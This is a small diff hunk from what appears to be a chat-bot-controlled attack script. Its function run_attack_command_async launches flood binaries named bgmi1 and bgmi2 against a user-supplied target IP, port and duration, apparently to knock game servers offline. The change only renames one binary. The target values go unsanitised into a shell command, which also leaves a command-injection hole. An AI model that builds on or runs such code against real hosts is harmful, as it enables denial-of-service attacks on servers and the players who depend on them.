@@ -72,7 +72,7 @@ async def start_asyncio_loop():
 
 async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
     # Start the first binary command
-    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} ")
+    process1 = await asyncio.create_subprocess_shell(f"./bgmi1 {target_ip} {target_port} {duration} ")
     
     # Start the second binary command
     process2 = await asyncio.create_subprocess_shell(f"./bgmi2 {target_ip} {target_port} {duration} 100")
